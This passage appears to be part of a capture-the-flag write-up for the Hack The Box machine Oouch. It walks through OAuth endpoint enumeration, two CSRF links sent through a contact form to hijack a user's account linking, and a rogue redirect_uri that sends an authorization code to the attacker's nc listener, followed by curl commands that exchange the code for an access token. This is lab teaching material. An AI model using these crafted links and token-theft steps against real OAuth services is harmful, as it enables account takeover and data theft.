+<p>Clicking on the link to <code class="language-plaintext highlighter-rouge">/oauth/authorize</code> returns an error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200308163436662.webp" type="image/webp"/>
+<img alt="image-20200308163436662" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200308163436662.png"/>
+</picture>
+<p>I will poke at that more <a href="#qtc-on-authorization">later</a>.</p>
+<p><code class="language-plaintext highlighter-rouge">/oauth/token</code> returns what looks like a blank page in the browser, but looking in Burp I see it’s a 405 Method Not Allowed response with no body:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">405</span> <span class="ne">Method Not Allowed</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Allow</span><span class="p">:</span> <span class="s">POST, OPTIONS</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization</span>
+</code></pre></div></div>
+<p>If I send that request to Repeater and change it to a post, I get a different error:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">400</span> <span class="ne">Bad Request</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">35</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization</span>
+
+<span class="p">{</span><span class="nl">"error"</span><span class="p">:</span><span class="w"> </span><span class="s2">"unsupported_grant_type"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>I could fuzz this, but given my understanding of OAuth from the introduction, I’m going to come back to this once I have the required inputs, <code class="language-plaintext highlighter-rouge">CLIENT_ID</code>, <code class="language-plaintext highlighter-rouge">CLIENT_SECRET</code>, <code class="language-plaintext highlighter-rouge">redirect_uri</code>, and <code class="language-plaintext highlighter-rouge">authorization_code</code>.</p>
+<h4 id="more-directory-brute-force">More Directory Brute Force</h4>
+<p>Before starting to work on Oauth, I also started another <code class="language-plaintext highlighter-rouge">gobuster</code> in the background to look for endpoints:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://authorization.oouch.htb:8000/oauth <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt <span class="nt">-t</span> 20 <span class="nt">-o</span> scans/gobuster-8000-oauth-big
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://authorization.oouch.htb:8000/oauth
+[+] Threads:        20
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/03/09 17:46:45 Starting gobuster
+===============================================================
+/applications (Status: 301)
+/authorize (Status: 301)
+/token (Status: 301)
+===============================================================
+2020/03/09 17:48:19 Finished
+===============================================================
+</span></code></pre></div></div>
+<p>It found the two endpoints I already knew about, but also this third endpoint, <code class="language-plaintext highlighter-rouge">/oauth/applications</code>, which I’ll need later. Visiting now just pops HTTP basic auth, and I don’t have valid creds.</p>
+<h3 id="oauth-2">Oauth</h3>
+<h4 id="connect-accounts">Connect Accounts</h4>
+<p>I started to explore how to the oath account connection process works. I started logged into both accounts in my browser. Then I visited the link from the consumer oauth page, <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect</code>. This is like saying “Login with Google” in a public example. Like above, I’m redirected to a page on <code class="language-plaintext highlighter-rouge">authorization.oouch.htb:8000</code>, but since I’m logged in, I get a page with a question:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200308171935111.webp" type="image/webp"/>
+<img alt="image-20200308171935111" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200308171935111.png"/>
+</picture>
+<p>When I click authorize, I’m redirected back to my profile page on port 5000, and now there’s a connected account:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200308172018997.webp" type="image/webp"/>
+<img alt="image-20200308172018997" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200308172018997.png"/>
+</picture>
+<h4 id="requests">Requests</h4>
+<p>Looking in Burp, I can see a series of five requests that lead back to <code class="language-plaintext highlighter-rouge">/profile</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200308202649128.webp" type="image/webp"/>
+<img alt="image-20200308202649128" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200308202649128.png"/>
+</picture>
+<p>Those five requests line up with the four requests in my diagram (plug the request to <code class="language-plaintext highlighter-rouge">/profile</code> which would come next in my diagram):</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20200730181927998.png"><img alt="OAuth Authorization Flow" src="https://0xdfimages.gitlab.io/img/image-20200730181927998.png"/><em>Click for full size image</em></a></p>
+<p>The first is a GET to <code class="language-plaintext highlighter-rouge">/oauth/connect</code>, with the cookie for the :5000 site <code class="language-plaintext highlighter-rouge">session</code>. It returns a 302 redirect to <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/oauth/authorize/</code> with four parameters:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82</code></li>
+<li><code class="language-plaintext highlighter-rouge">response_type=code</code></li>
+<li><code class="language-plaintext highlighter-rouge">redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token</code></li>
+<li><code class="language-plaintext highlighter-rouge">scope=read</code></li>
+</ul>
+<p>Following this redirect returns that page with the button for me to click Authorize. Clicking that button sends a POST to the same url, with the same parameters in the url, <em>and</em> the same parameters in the POST body, with three additional:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">csrfmiddlewaretoken=8LoJjvYe7uX6aivOdY7S9DaJgcIFT57CORNJ7x8J63SfG0sZ6zn6UFqj6gi5wdQO</code></li>
+<li><code class="language-plaintext highlighter-rouge">state=</code></li>
+<li><code class="language-plaintext highlighter-rouge">allow=Authorize</code></li>
+</ul>
+<p>That returns a 302 redirect to <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect/token</code> with the GET parameters <code class="language-plaintext highlighter-rouge">code=72blODjikMf0PbTJ27abbY34XnCjAs</code>.</p>
+<p>The request responds with another 302 redirect, this time to <code class="language-plaintext highlighter-rouge">/profile</code>.</p>
+<h2 id="shell-as-qtc-on-oouch">Shell as qtc on oouch</h2>
+<h3 id="qtc-on-consumer">qtc on consumer</h3>
+<h4 id="vulnerability">Vulnerability</h4>
+<p>I’m going to look at the process where the client is going back to the application with the authorization code.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200730171247468.webp" type="image/webp"/>
+<img alt="img" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200730171247468.png"/>
+</picture>
+<p>When the application receives this request, it will reach out to the authorization server and get information about the account that controls login for the application. If I can get someone else to submit this request, then their account will be linked to the account I control on the authorization server.</p>
+<p>From the <a href="https://medium.com/@darutk/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85">previous reference</a>, I can see the Request from the application (consumer) to authorization server looks like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET {Authorization Endpoint}
+  ?response_type=code             // - Required
+  &amp;client_id={Client ID}          // - Required
+  &amp;redirect_uri={Redirect URI}    // - Conditionally required
+  &amp;scope={Scopes}                 // - Optional
+  &amp;state={Arbitrary String}       // - Recommended
+  &amp;code_challenge={Challenge}     // - Optional
+  &amp;code_challenge_method={Method} // - Optional
+  HTTP/1.1
+HOST: {Authorization Server}
+</code></pre></div></div>
+<p>There’s a recommend (and therefore optional) parameter <code class="language-plaintext highlighter-rouge">state</code> designed to prevent this kind of Cross Site Request Forgery (CSRF) attack. This value isn’t shown to the client, but stored on consumer, associated with my account via cookie. Later, when the authorization is done, and a 302 to the <code class="language-plaintext highlighter-rouge">redirect_uri</code> is sent back, it’s sent back with the <code class="language-plaintext highlighter-rouge">code</code> and the <code class="language-plaintext highlighter-rouge">state</code> if in use. If that state value doesn’t match for the account loading the page, there’s a CSRF failure, and the process fails. Because the 302 from the authorization server with the <code class="language-plaintext highlighter-rouge">authorization_code</code> doesn’t include <code class="language-plaintext highlighter-rouge">state</code>, it must not be in use here, and this attack can work.</p>
+<h4 id="in-practice">In Practice</h4>
+<p>First I’ll create accounts for both servers (0xdf-consumer and 0xdf-auth), and log into both, and link the accounts.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200309173125506.webp" type="image/webp"/>
+<img alt="image-20200309173125506" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200309173125506.png"/>
+</picture>
+<p>Now I’ll start the account linking process again, but this time, I will have Burp Proxy intercepting each request. I’ll forward the first three requests, stopping when it’s trying to load <code class="language-plaintext highlighter-rouge">consumer.oouch.htb:5000/oauth/connect/token</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/oauth/connect/token?code=76tcpZBboMvWODlVU0LNkRDMVCQB7m</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">consumer.oouch.htb:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=.eJy1kM9OwzAMxl8ly3mg_G2aPQWCAwc0TY5jrxVdi5pUQpr27kSICwdOwMmy7N_n7_NVnniCMlCRh5erFLUVeaFS4ExyLx8mgkJiWs5inEVdBCC2oajDWMRb27mXx9v-77hHOo-lrlDHZRZP2yfE27QTzzThciGh3jPvfsHe4TKX7ULrDyL_avzb8eO-vX6lMshDXTdq3ZjlQZpoTWfARw_ck4smhaRZaRMwg0NryaPPoECDcsnnjEphz7lTDEZhJqaEnQMMGjoOTkPoooEUvY7EuSn0aD0k5a3jztiI1oSkjGKTk_WqZcGy8qkurzQ3P8FCAq1DMl3wzkGOifvggGyATNBDbC5cto3bCq1fIeTtA92OwOo.XmawFg.5VWJ9iBk8looCFxsuQTc5oCDMJ8</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+</code></pre></div></div>
+<p>I’ll craft that into a link, and drop the request so it’s not sent to the server:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://consumer.oouch.htb:5000/oauth/connect/token?code=QY4G64bZGMj05zy5Krq49HmMDHIP8w"</span><span class="nt">&gt;</span>click me<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+<p>I’ll submit the link to the contact form. After a minute or two, I’ll see 0xdf-auth is no longer connected in the Profile page for 0xdf-consumer:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200309173807145.webp" type="image/webp"/>
+<img alt="image-20200309173807145" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200309173807145.png"/>
+</picture>
+<p>I’ll log out, and then go to <code class="language-plaintext highlighter-rouge">/oauth/login</code>, and click yes when prompted to login using OAuth. But my account on the authorization server now is linked to whoever clicked the link. Visiting the Profile page, I see I’m logged in as qtc:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200309173903551.webp" type="image/webp"/>
+<img alt="image-20200309173903551" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200309173903551.png"/>
+</picture>
+<h3 id="qtc-on-authorization">qtc on authorization</h3>
+<h4 id="enumeration">Enumeration</h4>
+<p>Now with access to as qtc on the consumer site, I can see documents stored for the admin account:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200309174022442.webp" type="image/webp"/>
+<img alt="image-20200309174022442" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200309174022442.png"/>
+</picture>
+<p>The three documents each give a hint:</p>
+<ul>
+<li>I have credentials for application registration.</li>
+<li>I need to find <code class="language-plaintext highlighter-rouge">/api/get_user</code> API and use it to get user data</li>
+<li>The <code class="language-plaintext highlighter-rouge">/oauth/authorize</code> method, which I saw in the Oauth flow above as a POST, now supports GET, which makes sending it as a link to the contact form a possibility.</li>
+<li>I’ll eventually find SSH keys for qtc which I’ll use to get a shell.</li>
+</ul>
+<p>Remembering the <code class="language-plaintext highlighter-rouge">/oauth/applications</code> path from <a href="#more-directory-brute-force">above</a>, I started to poke around there. It asks for HTTP auth, but it doesn’t work. Eventually I tried <code class="language-plaintext highlighter-rouge">/oauth/applications/register</code>, and the creds for HTTP basic auth do work there.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200311061131193.webp" type="image/webp"/>
+<img alt="image-20200311061131193" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200311061131193.png"/>
+</picture>
+<p>Now I can register an application with the authorization server. Why does this matter? If I can trick something to authorizing my application to connect with the authorization server, I can request the info from the authorization server about that user (which it sounds like included SSH keys).</p>
+<p>I was able to register an application with a <code class="language-plaintext highlighter-rouge">redirect_uri</code> of my box (<code class="language-plaintext highlighter-rouge">/token</code> is arbitrary, but once I set it here, it has to match in subsequent applications):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200311065052285.webp" type="image/webp"/>
+<img alt="image-20200311065052285" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200311065052285.png"/>
+</picture>
+<p>It gives me the <code class="language-plaintext highlighter-rouge">CLIENT_ID</code> and <code class="language-plaintext highlighter-rouge">CLIENT_SECRET</code> for the app.</p>
+<h4 id="8000oauthauthorize">:8000/oauth/authorize</h4>
+<p>With the idea that there are different applications (and now I can create them) in mind, I wanted to look at the OAuth flows associated with <code class="language-plaintext highlighter-rouge">:8000/oauth/authorize</code> again. Earlier when I hit this endpoint directly, it returned a missing client_id error. When looking at the Oauth flows in Burp when I was linking my profile, I see two requests in a row to this API. First a GET, then a POST. These represent the two marked requests in the diagram:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20200730174605174.png"><img alt="img" src="https://0xdfimages.gitlab.io/img/image-20200730174605174.png"/><em>Click for full size image</em></a></p>
+<p>These requests both include <code class="language-plaintext highlighter-rouge">client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82</code>. This is the ID that the application on port 5000 received when it registered with the authorization server on port 8000.</p>
+<p>I’ll grab the POST request to <code class="language-plaintext highlighter-rouge">:8000/oauth/authorize</code> in Burp Proxy and kick it over to repeater:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&amp;scope=read</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&amp;scope=read</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">264</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=OGnVcXdWziRrIcISRJovzoNterqmLZeifBvxetEu1Inl5LeMP8zTuuHL05bAzVlL; sessionid=1rzmsqcaprtztfba3xxywdrtk1u5vz3j</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+csrfmiddlewaretoken=jqwRWtcqi4BTXPHM88lUdUvmFqyCzbWNKicTe2AzGMxTcla1PACQiKx23Wmb0hVR&amp;redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Flogin%2Ftoken&amp;scope=read&amp;client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;state=&amp;response_type=code&amp;allow=Authorize
+</code></pre></div></div>
+<p>If I send this, I get back a 302 redirect to the <code class="language-plaintext highlighter-rouge">redirect_uri</code> with the code attached:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://consumer.oouch.htb:5000/oauth/login/token?code=9E3iRBIZpLtvrwuC0NeNuvWckA3yI8</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization, Cookie</span>
+</code></pre></div></div>
+<p>The notes above suggest that this endpoint now supports GET. To convert this to a GET, I started by changing <code class="language-plaintext highlighter-rouge">POST</code> to <code class="language-plaintext highlighter-rouge">GET</code>, but that just leads to the page with the button to click Authorize, just like in the Oauth flow originally. I started playing with various POST parameters from the request above, adding them as GET parameters. Once I add <code class="language-plaintext highlighter-rouge">&amp;allow=Authorize</code> to the GET parameters, I get the redirect I’m looking for. I’ll clean up the request a bit more and get:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&amp;scope=read&amp;allow=Authorize&amp;state=</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&amp;scope=read</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">sessionid=nr57zmuau38o2j89sgbecvg83jyu4px6</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+</code></pre></div></div>
+<p>I was able to take out both the CSRF parameter in the POST and the CSRF cookie. I could also take out the <code class="language-plaintext highlighter-rouge">sessionid</code> cookie, but then I get the login page instead of the <code class="language-plaintext highlighter-rouge">redirect_uri</code>.</p>
+<p>Now I want to change the <code class="language-plaintext highlighter-rouge">redirect_url</code> to something else, but it returns a 400 Bad request:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="nt">&lt;h2&gt;</span>Error: invalid_request<span class="nt">&lt;/h2&gt;</span>
+            <span class="nt">&lt;p&gt;</span>Mismatching redirect URI.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+<p>If I update the <code class="language-plaintext highlighter-rouge">client_id</code> and the <code class="language-plaintext highlighter-rouge">redirect_uri</code> to match what I registered above, the request will come back without throwing that error:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/oauth/authorize/?client_id=d3VwRo9trmopGfGpiYUsKhkwE674SgAM3wT5A6EQ&amp;response_type=code&amp;redirect_uri=http://10.10.14.6/token&amp;scope=read&amp;allow=Authorize&amp;state=</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&amp;scope=read</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">sessionid=nr57zmuau38o2j89sgbecvg83jyu4px6</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+</code></pre></div></div>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://10.10.14.6/token?code=eG2kDsLExEKn8tVtzqERCXwyx7b95U</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization, Cookie</span>
+</code></pre></div></div>
+<h4 id="csrf-2">CSRF #2</h4>
+<p>With the GET request above, I can now send this as a link to the admin and have them click on it and redirect to me. I’ll create the following link:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://authorization.oouch.htb:8000/oauth/authorize/?client_id=d3VwRo9trmopGfGpiYUsKhkwE674SgAM3wT5A6EQ&amp;response_type=code&amp;redirect_uri=http://10.10.14.6/token&amp;scope=read&amp;state=&amp;allow=Authorize"</span><span class="nt">&gt;</span>click me<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+<p>About a minute after sending this through the contact form, someone clicks on it from Oouch, and this request comes back:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali# nc -lnvp 80
+listening on [any] 80 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 45972
+</span><span class="nf">GET</span> <span class="nn">/token?code=9a5Q0yBlx7ONDslRKGlulr6a7i8vOM</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.6</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.21.0</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">sessionid=0wlwoshe5nbpgmgw7357g0a9fgq4xowx;</span>
+</code></pre></div></div>
+<p>What just happened? I sent a link that when clicked on started the person who clicked in the process of telling the authentication server that they wanted my application to get access to their data on the authorization server, with the request marked in red below. What comes back to my <code class="language-plaintext highlighter-rouge">nc</code> listener is the client’s browser being redirected to my application with the request marked in green:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20200730181927999.png"><img alt="img" src="https://0xdfimages.gitlab.io/img/image-20200730181927999.png"/><em>Click for full size image</em></a></p>
+<p>I did notice that a PHP session cookie was included in that request. This makes no sense to me, but I’ll look at it in <a href="#unintended-session-hijack">Beyond Root</a>.</p>
+<h4 id="request-access-token">Request Access Token</h4>
+<p>When the client sends me the <code class="language-plaintext highlighter-rouge">authorization_code</code>, I can use that to request an <code class="language-plaintext highlighter-rouge">access_token</code>.</p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">curl</code> to send the request with the <code class="language-plaintext highlighter-rouge">client_id</code>, <code class="language-plaintext highlighter-rouge">client_secret</code>, and <code class="language-plaintext highlighter-rouge">grant_type</code> from my application (the secret and id are different from the image above because I had to re-register to update this post), the <code class="language-plaintext highlighter-rouge">redirect_uri</code> , and the <code class="language-plaintext highlighter-rouge">code</code> (pipped into <code class="language-plaintext highlighter-rouge">jq</code> to make the result more readable):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://authorization.oouch.htb:8000/oauth/token/ <span class="nt">-d</span> <span class="s1">'client_id=HTGoodnXs4IMOYhJzfss3JmF7m64bQHkoPwZOghy&amp;client_secret=5MUCcGC9TlHJOWqmT2qJjqxKHHIzdGKE8PKqoIOgfhecIUPjoSTnxhWdNWI4BgqLb2yMcnq1N5viFgArgkd6PSWWxfJLPsxYP0kAgAS6AmoF9gNFVO56jymUpcnBYunm&amp;redirect_uri=http://10.10.14.6/token&amp;code=Yv0c6OXDFGhpMJ2nqvDTbMVcOfo3Si&amp;grant_type=authorization_code'</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "access_token": "gm05wp2kDWhSmS3QrZmdEqgvFGoEKD",
+  "expires_in": 600,
+  "token_type": "Bearer",
+  "scope": "read",
+  "refresh_token": "lGaAVRyhTybjuiRrF8SVPgiSNXR9Bk"
+}
+</span></code></pre></div></div>
+<p>It is worth noting the <code class="language-plaintext highlighter-rouge">expires_in</code> value of ten minutes. I lost some time enumerating the API when the token expired and I didn’t realize it. I can use the <code class="language-plaintext highlighter-rouge">refresh_token</code> to request a new <code class="language-plaintext highlighter-rouge">access_token</code> (I’ll leave that as an exercise for the reader).</p>
+<h3 id="ssh-as-qtc">SSH as qtc</h3>
+<h4 id="get_user">get_user</h4>
+<p>I still have the hint about <code class="language-plaintext highlighter-rouge">/api/get_user</code>, and it makes sense now that I have an <code class="language-plaintext highlighter-rouge">access_token</code> to access qtc’s data. I was able to find the API pretty easily at <code class="language-plaintext highlighter-rouge">authorization.oouch.htb:8000/api/get_user</code>. In a browser, it just returns a blank page. In Burp, I see it’s a 403:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">403</span> <span class="ne">Forbidden</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
